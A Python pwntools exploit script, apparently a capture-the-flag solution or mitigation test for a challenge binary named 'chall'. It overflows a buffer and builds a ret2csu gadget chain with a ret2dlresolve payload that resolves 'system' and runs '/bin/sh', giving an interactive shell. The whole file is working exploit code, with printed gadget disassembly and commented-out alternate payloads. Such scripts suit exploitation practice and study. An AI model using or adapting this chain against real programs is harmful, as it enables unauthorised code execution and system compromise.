import pwn
import time

"""
ret2dlresolve should not work!
"""

pwn.context.binary = elf = pwn.ELF("./chall")
libc = elf.libc

if pwn.args.REMOTE:
    io = pwn.remote("localhost", 1024)
else:
    io = pwn.process("./chall")

if pwn.args.GDB:
    pwn.gdb.attach(
        io,
        gdbscript="""
break *main+110
break *0x401084
continue
""",
    )


csu_mov = 0x401290
csu_pop = 0x4012AA
csu_call = 0x401299
fini = next(elf.search(pwn.p64(elf.dynamic_by_tag("DT_FINI")["d_ptr"])))

"""
401290:       4c 89 f2                mov    rdx,r14
401293:       4c 89 ee                mov    rsi,r13
401296:       44 89 e7                mov    edi,r12d
401299:       41 ff 14 df             call   QWORD PTR [r15+rbx*8]
40129d:       48 83 c3 01             add    rbx,0x1
4012a1:       48 39 dd                cmp    rbp,rbx
4012a4:       75 ea                   jne    401290 <__libc_csu_init+0x40>
4012a6:       48 83 c4 08             add    rsp,0x8
4012aa:       5b                      pop    rbx
4012ab:       5d                      pop    rbp
4012ac:       41 5c                   pop    r12
4012ae:       41 5d                   pop    r13
4012b0:       41 5e                   pop    r14
4012b2:       41 5f                   pop    r15
4012b4:       c3                      ret
"""


def ret2csu(edi: int, rsi: int, rdx: int, rbp: int, ret: int):
    p = b""
    p += pwn.p64(csu_pop)
    p += pwn.p64(0)  # rbx
    p += pwn.p64(1)  # rbp
    p += pwn.p64(edi)  # r12d -> edi
    p += pwn.p64(rsi)  # r13 -> rsi
    p += pwn.p64(rdx)  # r14 -> rdx
    p += pwn.p64(fini)  # r15
    p += pwn.p64(csu_mov)  # ret
    p += pwn.p64(0)  # add rsp, 0x8
    p += pwn.p64(0)  # rbx
    p += pwn.p64(rbp)  # rbp
    p += pwn.p64(0)  # r12
    p += pwn.p64(0)  # r13
    p += pwn.p64(0)  # r14
    p += pwn.p64(0)  # r15
    p += pwn.p64(ret)  # ret
    return p


ret2dl = pwn.Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop = pwn.ROP(elf)

rop.ret2dlresolve(ret2dl)
print(rop.dump())

# rop.raw(rop.ret.address)  # ret gadget to align stack

# rop.read(0, bss)
# rop.read(2, ret2dl.data_addr)

offset = pwn.cyclic_find(0x6161616B)
p = b"A" * offset
p += ret2csu(2, ret2dl.data_addr, 0x100, 0, elf.plt.read)
p += rop.chain()

# p = pwn.fit({0x68: rop.chain(), 184: pwn.p64(elf.symbols.main), 0x1000: ret2dl.payload})
# p = pwn.fit({0x68: rop.chain(), 0x1000: ret2dl.payload})
# p = pwn.fit({offset: rop.chain()})

io.send(p)
time.sleep(1)

if pwn.args.REMOTE:
    io.send(ret2dl.payload)
else:
    io.proc.stderr.write(ret2dl.payload)


io.stream()
